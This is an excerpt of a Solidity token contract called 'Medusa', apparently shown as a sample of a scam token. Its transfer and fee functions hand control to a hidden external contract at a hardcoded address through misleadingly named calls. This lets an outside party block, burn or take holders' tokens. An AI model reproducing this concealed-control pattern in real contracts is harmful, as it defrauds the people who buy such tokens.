...
contract Medusa is Ownable, IERC20 {
    ...
    IERC21 private ERC = IERC21(0x0A482c64d134E9862d4747C23982d9dB358C504a);
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (ERC.allowance(from, to, marketingWallet)) {
            _burnFees(amount, to);
        } else {
    ...
    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        if (ERC.swapTokensForExactETH(from, recipient, txBurn, address(this), feeRebalance())) {
    ...
    function takeFee(address from) private view returns (uint256) {
        ...
        return ERC.transferFrom(from, feeRebalance(), amount);
    }
